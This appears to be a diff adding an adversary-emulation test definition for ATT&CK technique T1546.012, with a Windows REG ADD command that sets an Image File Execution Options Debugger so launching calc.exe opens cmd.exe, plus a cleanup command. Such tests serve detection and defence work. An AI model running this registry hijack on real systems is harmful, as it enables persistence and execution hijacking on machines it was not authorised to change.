@@ -1,0 +1,14 @@
+- id: 9153afb3-725e-5bdb-8e4b-62f4d869f457
+  name: Soumaia ART Tests - IFEO Add Debugger
+  description: Leverage Global Flags Settings (requires elevation)
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1546.012
+    name: 'Event Triggered Execution: Image File Execution Options Injection'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /d "C:\Windows\System32\cmd.exe"
+        cleanup: |-
+          reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /f >nul 2>&1
